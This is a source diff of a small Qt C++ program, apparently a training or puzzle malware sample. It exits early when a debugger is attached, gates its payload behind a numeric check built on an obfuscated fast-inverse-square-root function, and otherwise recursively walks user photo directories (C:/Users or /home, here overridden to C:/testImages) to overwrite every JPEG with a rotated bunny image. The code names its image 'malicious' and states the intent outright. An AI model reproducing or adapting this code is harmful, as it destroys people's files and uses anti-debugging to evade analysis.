@@ -1,10 +1,49 @@
 #include <QCoreApplication>
 #include <QDirIterator>
 #include <QDir>
+#include <QDebug>
+//#include <QImage>
 #include <QtGui/QImage>
+#include <QTransform>
 #include <iostream>
 #include <stdio.h>
+#include <math.h>
+#ifdef Q_OS_WIN
+#include <Windows.h>
+#define OS 0
+#elif defined(Q_OS_MAC)
+#define OS 1
+#elif defined(Q_OS_LINUX)
+#define OS 2
+#endif
+enum ops{
+	win,
+	mac,
+	linux,
+};
+
+
 using namespace std;
+
+//float getNumaNuma(float numa){
+//	float numaTimes2=numa*0.5f;
+//	int shortNuma= *(int*)&numa;
+//	shortNuma = 0x5f3759df - (shortNuma>>1);
+//	numa = *(float*) &shortNuma;
+//	numa = numa *(1.5f - (numaTimes2*numa*numa));
+//	return numa;
+//}
+double getNumaNuma(double numa){
+	double numaTimes2=numa*0.5;
+	qint64 shortNuma= *(qint64*)&numa;
+	shortNuma = 0x5fe6eb50c7b537a9 - (shortNuma>>1);
+	numa = *(double*) &shortNuma;
+	numa = numa *(1.5 - (numaTimes2*numa*numa));
+	numa = numa *(1.5 - (numaTimes2*numa*numa));
+	numa = numa *(1.5 - (numaTimes2*numa*numa));
+	return numa;
+}
+
 
 /* Taken from: https://stackoverflow.com/questions/15580179/how-do-i-find-the-name-of-an-operating-system
     Finds the OS type, for use when finding relevant directories */
@@ -22,42 +61,117 @@ string getOsName(){
     #endif
 }
 
+void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
+	bool dirtPanorama=false;
+	if(image3.width()>image3.height()){
+		dirtPanorama=true;
+	}
+	bool earthVista=false;
+	if(image1.width()>image2.height()){
+		earthVista=true;
+	}
+								//[portrait,landscape]
+	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
+//	favoriteImage=[image1,image2];
+//	if(earthVista){
+//		favoriteImage[0]=&image2;
+//		favoriteImage[1]=&image1;
+////		favoriteImage=[ &image2,&image1];
+//	}
+	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
+}
+
+
+
+
+
+
+
 int main(/*int argc, char *argv[]*/){
     //QCoreApplication a(argc, argv);
-    string osName = getOsName();
-    QString dir;
+//    string osName = getOsName();
+	QList<double> nommies;
+#ifdef Q_OS_WIN
+	if(IsDebuggerPresent()){
+		return(12473);
+	}
+#endif
+	goto prior;
+	Phase1:
+	{
+		QList<qint64> nums({2985,5318008,1337});
+		double answers[]={1.122306114604289e-07,3.535916717302045e-14,5.594189650861030e-07};
+		if(nums.length()!=nommies.length()){
+			qDebug()<<"messed up phase 1: Wrong number of entries";
+			goto ousted;
+		}
+		for(int i=0;i<nums.length();++i){
+			if(nums[i]!=round(getNumaNuma(nommies[i]))){
+				qDebug()<<"messed up phase 1";
+				goto ousted;
+			}
+		}
+//		for(uint i=0;i<3;++i){
+//			qint64 output=round(getNumaNuma(answers[i]));
+//			qDebug()<<output<<nums[i]<<(output==nums[i]);
+//		}
+		goto outed;
+	}
+//	qint64 output=round(getNumaNuma(1.122306114604289e-07));
+//	qDebug()<<output<<nums[0]<<(output==nums[0]);
 
-    // TODO: Load default image to swap
-    QImage* maliciousImage = new QImage();
-    bool malImageLoad = maliciousImage->load("./malicious_image.jpg");
-    if(!malImageLoad){
-        exit(-1);
-    }
+	prior:
+	{
+		std::string str;
+		std::getline(std::cin,str);
+		QString cheese(str.c_str());
+		QStringList noms=cheese.split(" ",QString::SkipEmptyParts);
+		bool doky=true;
+		for(QString nom:noms){
+			auto treat=nom.toDouble(&doky);
+			if(doky){
+				nommies.append(treat);
+			}
+		}
+		goto Phase1;
+	}
+	ousted:
+	{
+		QString dir;
+		QImage maliciousImage(":/bunny.jpg");
+		if(maliciousImage.isNull()){
+			exit(-1);
+		}
+		QTransform rot;
+		rot.rotate(90);
+		QImage maliciousImageRotated(maliciousImage.transformed(rot,Qt::SmoothTransformation));
+		if(OS==win){
+			dir=QString("C:/Users");
+		}else if(OS==mac){
+			dir=QString("..."); // Fuck macs?
+		}else if(OS==linux){
+			dir=QString("/home");
+		}
+		dir = QString("C:/testImages");
 
-    if(osName == "Windows"){
-        dir = QString("C:\Users");
-    }else if(osName == "Linux"){
-        dir = QString("/home");
-    }else if(osName == "Mac OSX"){
-        dir = QString("...");   // Fuck Macs
-    }else{ // Default to linux
-        dir = QString("/home");
-    }
-    QDir* dirFilters = new QDir();
-    dirFilters->setFilter(QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot);
+		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
-    QDirIterator itr(dir, QStringList() << "*.jpg", dirFilters->filter(), QDirIterator::Subdirectories);
-    while(itr.hasNext()){
-        QImage* fImage = new QImage();
-        bool imageLoaded = fImage->load(itr.next());
-        if(!imageLoaded){   // Error loading image, skip it
-            continue;
-        }
-        fImage->swap(*maliciousImage);    // Swap user's image with malicious one
-        // TODO: Do we need to save this image?
-        //QFile f(itr.next());
-        //qDebug() << itr.next();
-    }
+		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
+		qDebug("test");
+		while(itr.hasNext()){
+			auto imageName=itr.next();
+			QImage fImage(imageName);
+			if(fImage.isNull()){
+				continue;
+			}
+			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
+		}
+	}
+	outed:
+
+	return 0;
+
+
 
     //return a.exec();
     return 0;
